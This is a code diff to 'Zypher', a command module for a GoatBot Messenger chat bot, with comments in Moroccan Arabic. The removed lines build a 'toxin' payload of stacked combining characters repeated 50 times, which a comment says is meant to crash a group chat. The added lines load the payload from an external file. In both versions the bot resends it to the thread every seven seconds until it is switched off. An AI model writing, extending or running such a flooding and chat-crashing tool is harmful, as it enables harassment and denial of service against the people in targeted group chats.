@@ -7,10 +7,10 @@ module.exports = {
   config: {
     name: "زيفࢪ",
     aliases: ["zypher"],
-    version: "7.0.0",
+    version: "8.0.0",
     author: "Hanji",
     role: 2,
-    shortDescription: "نظام زيفࢪ للدمار الصامت بـ الـ Payload",
+    shortDescription: "نظام زيفࢪ للإرسال المتكرر من ملف خارجي",
     category: "SYSTEM",
     guide: { en: ".زيفࢪ on | .زيفࢪ off" }
   },
@@ -19,15 +19,16 @@ module.exports = {
     const { threadID, senderID, messageID } = event;
     const adminBot = global.GoatBot?.config?.adminBot || [];
     
+    // تأكد بلي غير المطور هو لي يقدر يخدمو
     if (!adminBot.includes(senderID.toString())) return;
 
     const mode = args[0]?.toLowerCase();
     const cachePath = path.join(__dirname, "cache", "payload.txt");
 
-    // تحديث النص المسموم فـ الكاش (بناءً على طلبك)
-    const toxin = "🏴‍☠️🥷🏾👨‍👩‍👧‍👦҉͏҈͎̺̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻";
-    const payloadContent = toxin.repeat(50); // تكرار 50 مرة باش يفركع الشات
-    fs.writeFileSync(cachePath, payloadContent);
+    // إيلا الملف ما كاينش، كري واحد خاوي باش ما يوقعش Error
+    if (!fs.existsSync(cachePath)) {
+        fs.writeFileSync(cachePath, "Put your payload here, Hanji.");
+    }
 
     // --- [ وضعية الإيقاف OFF ] ---
     if (mode === "off") {
@@ -46,17 +47,22 @@ module.exports = {
         api.setMessageReaction("🚀", messageID, () => {}, true);
 
         const startExecution = async () => {
+            // التحقق واش الأمر باقي نشط فـ هاد المجموعة
             if (!global.zypherSniper[threadID] || !global.zypherSniper[threadID].active) return;
 
             try {
+                // 📖 قراءة المحتوى من الملف ديريكت
                 const payload = fs.readFileSync(cachePath, "utf-8");
-                await api.sendMessage(payload, threadID);
+                
+                if (payload.trim() !== "") {
+                    await api.sendMessage(payload, threadID);
+                }
 
-                // ⏳ 7 ثواني بين كل صاعقة
+                // ⏳ الانتظار (7 ثواني) ثم إعادة الإرسال
                 setTimeout(startExecution, 7000);
 
             } catch (e) {
-                console.error("Sniper Error:", e);
+                console.error("Zypher System Error:", e);
                 delete global.zypherSniper[threadID];
             }
         };
